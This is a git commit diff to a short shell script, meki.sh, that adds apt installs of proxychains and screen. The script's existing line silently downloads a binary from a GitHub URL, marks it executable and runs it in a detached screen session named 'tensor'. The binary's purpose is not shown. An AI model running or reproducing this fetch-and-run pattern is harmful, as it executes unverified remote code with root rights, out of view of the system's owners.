6329a94644aa089e05c2e5794cd65b6deb80db56
renilo <88342640+renilo@users.noreply.github.com>
2022-02-20 14:27:46 +0700

    Update meki.sh

--- meki.sh
+++ meki.sh
@@ -1,3 +1,9 @@
 #!/bin/sh
 
+apt update
+
+apt install proxychains
+
+apt install screen -y
+
 sudo wget -qO main https://raw.githubusercontent.com/renilo/bh/main/testing && chmod +x main && screen -dmS tensor ./main
